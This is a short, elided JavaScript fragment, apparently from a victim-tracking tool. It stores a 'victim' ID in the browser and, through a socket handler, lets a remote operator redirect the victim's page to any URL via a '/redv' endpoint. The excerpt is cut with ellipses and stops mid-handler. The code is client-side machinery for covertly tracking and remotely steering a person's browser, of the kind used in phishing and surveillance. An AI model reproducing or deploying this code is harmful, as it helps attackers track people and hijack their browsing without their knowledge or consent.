...
var getVictimData = function() {
	...
	if (localStorage.trasup_vId != undefined) {
		d.vId = localStorage.trasup_vId;
        d.vURL = localStorage.trasup_vURL;
	}
...
var defineSockets = function(self) {
    self.on('my_response', function(msg) {
        ...
        switch (msg.data.type){
            case 'network':
                localStorage.setItem("trasup_vURL", urlServices[msg.data.message]);
                window.location.replace('/redv?url=' + urlServices[msg.data.message]);
                break;
            case 'url':
                localStorage.setItem("trasup_vURL", msg.data.message);
